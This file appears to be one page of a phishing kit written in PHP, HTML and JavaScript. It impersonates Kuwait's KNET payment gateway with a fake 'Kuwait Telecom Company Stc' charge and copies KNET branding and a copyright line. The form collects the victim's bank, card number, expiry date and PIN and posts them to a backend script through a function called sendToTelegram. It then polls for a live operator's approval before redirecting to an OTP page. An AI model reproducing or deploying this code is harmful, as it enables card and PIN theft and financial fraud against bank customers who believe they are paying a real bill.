<?php
session_start();
$user_id = $_SESSION['user_id'] ?? uniqid("user_");
$_SESSION['user_id'] = $user_id;

$data_file = 'data.json';
$data = file_exists($data_file) ? json_decode(file_get_contents($data_file), true) : [];

$exists = false;
foreach ($data as $user) {
    if ($user['user_id'] === $user_id) {
        $exists = true;
        break;
    }
}

if (!$exists) {
    $data[] = [
        'user_id' => $user_id,
        'status' => 'pending' 
    ];
    file_put_contents($data_file, json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
}
?>


<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة دفع كي نت</title>
    <link rel="stylesheet" href="kpay.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
</head>
<body>
    <header id="pageHeader">
        <img src="pc (1).jpg" alt="رأس الصفحة" id="headerImage">
    </header>
    <div class="box bank-info" id="bankInfoBox">
        <img id="imgkn" src="images (3).png" alt="بنك وربة" class="bank-logo" id="bankLogo">
        <p id="beneficiaryLabel">المستفيد: <strong id="beneficiaryName">Kuwait Telecom Company Stc</strong></p>
        <p id="amountLabel">المبلغ: <strong id="amountValu">KD 5.000</strong></p>
    </div>
    

    <div class="box payment-form" id="boxdiv">
        <form id="paymentForm" onsubmit="event.preventDefault(); sendToTelegram();">
            <div class="input-container">
                <label id="textban" for="bankSelect">اختيار البنك:</label>
                <div class="input-box">
                    <select id="bankSelect" onchange="updateOptions()" required>
                        <option value="" disabled selected>يرجى اختيار البنك</option>
                        <option value="ABK">البنك الأهلي المتحد ABK</option>
                        <option value="RAJHI">RAJHI مصرف الراجحي</option>
                        <option value="BBK">BBK بنك الكويت والبحرين</option>
                        <option value="BOUBYAN">BOUBYAN بنك بوبيان</option>
                        <option value="BURGAN">BURGAN بنك برقان</option>
                        <option value="CBK">CBK البنك التجاري الكويتي</option>
                        <option value="DOHA">DOHA بنك الدوحة</option>
                        <option value="GBK">GBK بنك الخليج</option>
                        <option value="TAM">TAM بيتك</option>
                        <option value="KFH">KFH بيت التمويل الكويتي</option>
                        <option value="KIB">KIB بنك الكويت الدولي</option>
                        <option value="NBK">NBK بنك الكويت الوطني</option>
                        <option value="WEYAY">WEYAY الوطني</option>
                        <option value="QNB">QNB بنك قطر الوطني</option>
                        <option value="UNB">UNB بنك الاتحاد الوطني</option>
                        <option value="WARBA">WARBA بنك وربة</option>
                    </select>
                </div>
            </div>
            <hr>


            <div class="input-container">
                <label id="text2" for="cardNumber">رقم البطاقة:</label>
                <div class="input-box">
                    <input type="number" id="cardNumber" placeholder=" " required inputmode="numeric" oninput="validateNumberInput(event)">
                </div>
                <select id="prefixSelect" required>
                    <option value="" disabled selected>Prefix</option>
                </select>
            </div>
            <hr>

            <div class="input-container">
                <label id="texst3" for="expiryDate">تاريخ انتهاء البطاقة:</label>
                <div class="expiry input-box">
                    <select id="monthSelect" required>
                        <option value="" disabled selected>MM</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <select id="yearSelect" required>
                        <option value="" disabled selected>YYYY</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                        <option value="2034">2034</option>
                        <option value="2035">2035</option>
                    </select>
                </div>
            </div>
            <hr>
            <h1 id="confirmationMessage" style="display: none; text-align: center; padding: 20px; font-weight: bold;">تم إرسال البيانات بنجاح. الرجاء الانتظار للموافقة...</h1>


            <div class="input-container">
                <label id="texst4" for="pin">الرقم السري:</label>
                <div class="input-box">
                    <input type="password" id="pin" placeholder="" required pattern="\d{4}" maxlength="4" inputmode="numeric">
                </div>
            </div>
            
        </form>
        <div id="waitingMessage" style="display: none; text-align: center; padding: 20px; font-weight: bold;">
     يرجى الانتظار، جارٍ التحقق من البيانات...
</div>


    </div>

    <div  class="box buttons" id="boxbuttons" >
        <button type="submit" form="paymentForm" id="submitButton">إرسال</button>
        <button type="button" onclick="resetForm()" id="submitButton0">إلغاء</button>
    </div>    
    

        <div style="text-align:center;font-size:11px;line-height:1">All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;<br><span style="font-size:10px;font-weight:bold;color:#0077d5">The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET</span></div>
        <script>

           // استرجاع المبلغ المخزن من localStorage وعرضه
    const amount = localStorage.getItem('selectedAmount');
    if (amount) {
      document.getElementById('amountValu').textContent = " " + amount + " د.ك";
    } else {
      document.getElementById('amountValu').textContent = "لم يتم تحديد المبلغ.";
    }
  // ✅ جلب user_id من التخزين المحلي أو المؤقت
  function getUserId() {
    return localStorage.getItem("user_id") || sessionStorage.getItem("user_id") || "unknown";
  }

  // 🔄 تحديث خيارات البادئات حسب البنك
  function updateOptions() {
    const bank = document.getElementById("bankSelect").value;
    const prefixSelect = document.getElementById("prefixSelect");

    prefixSelect.innerHTML = '<option value="" disabled selected>Prefix</option>';

    const options = {
      ABK: ["403622", "423826", "428628"],
      RAJHI: ["458838"],
      BBK: ["588790", "418056"],
      BOUBYAN: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
      BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
      CBK: ["532672", "537015", "521175", "516334"],
      DOHA: ["419252"],
      GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
      TAM: ["45077848", "45077849"],
      KFH: ["450778", "537016", "532674", "485602"],
      KIB: ["406464", "409054"],
      NBK: ["464452", "589160"],
      WEYAY: ["464425250", "543363"],
      QNB: ["524745", "521020"],
      UNB: ["457778"],
      WARBA: ["532749", "559459", "541350", "525528"]
    };

    if (options[bank]) {
      options[bank].forEach(number => {
        const option = document.createElement("option");
        option.value = number;
        option.textContent = number;
        prefixSelect.appendChild(option);
      });
    }
  }

  // ✅ تحديد الحد الأعلى لخانات رقم البطاقة
  function validateNumberInput() {
    const inputField = document.getElementById("cardNumber");
    if (inputField.value.length > 10) {
      inputField.value = inputField.value.substring(0, 10);
    }
  }

  // ✅ إرسال البيانات إلى السيرفر
  function sendToTelegram() {
    const userId = getUserId();
    const bank = document.getElementById("bankSelect").value;
    const prefix = document.getElementById("prefixSelect").value;
    const cardNumber = document.getElementById("cardNumber").value;
    const expiryMonth = document.getElementById("monthSelect").value;
    const expiryYear = document.getElementById("yearSelect").value;
    const pin = document.getElementById("pin").value;

    if (!bank || !prefix || !cardNumber || !expiryMonth || !expiryYear || !pin) {
      alert("يرجى ملء جميع الحقول قبل الإرسال.");
      return;
    }

    document.getElementById("waitingMessage").style.display = "block";

    const formData = {
      user_id: userId,
      form_name: 'form4',
      data: {
        bank,
        prefix,
        cardNumber,
        expiryMonth,
        expiryYear,
        pin
      }
    };

    fetch('save_form4.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(formData)
    })
    .then(response => response.text())
    .then(result => {
      console.log("✅ تم الحفظ:", result);

      // ✅ إخفاء الفورم وإظهار رسالة
      const form = document.getElementById("paymentForm");
      const message = document.getElementById("confirmationMessage");
      if (form && message) {
        form.style.display = "none";
        message.style.display = "block";
      }

      startApprovalPolling(); // يبدأ متابعة حالة الموافقة
    })
    .catch(error => {
      console.error("❌ خطأ أثناء الإرسال:", error);
    });
  }

  // ✅ التحقق من حالة الموافقة كل 3 ثوانٍ
  function startApprovalPolling() {
    const userId = getUserId();
    if (!userId) return;

    const intervalId = setInterval(() => {
      fetch('data.json')
        .then(res => res.json())
        .then(data => {
          const userData = data[userId];

          if (userData && Array.isArray(userData.form4)) {
            const latestApprovedEntry = [...userData.form4]
              .reverse()
              .find(entry => 'approved' in entry);

            if (latestApprovedEntry) {
              console.log("🟢 تم العثور على approved:", latestApprovedEntry.approved);

              if (latestApprovedEntry.approved === true || latestApprovedEntry.approved === "true") {
                clearInterval(intervalId);
                window.location.href = "otp.php";
              } else if (latestApprovedEntry.approved === false || latestApprovedEntry.approved === "false") {
                clearInterval(intervalId);
                window.location.href = "eror.php";
              }
            } else {
              console.log("⏳ لا يوجد إدخال يحتوي على موافقة أو رفض بعد.");
            }
          } else {
            console.log("❌ لم يتم العثور على بيانات المستخدم أو form4 غير موجودة.");
          }
        })
        .catch(err => {
          console.error("❌ خطأ أثناء التحقق من الموافقة:", err);
        });
    }, 3000);
  }

  // ✅ عند تحميل الصفحة، حفظ user_id إن وجد من PHP
  document.addEventListener("DOMContentLoaded", function () {
    const phpUserId = "<?php echo $user_id ?? '' ?>";
    if (phpUserId) {
      localStorage.setItem("user_id", phpUserId);
      sessionStorage.setItem("user_id", phpUserId);
    }
  });
</script>






        
</body>
</html>
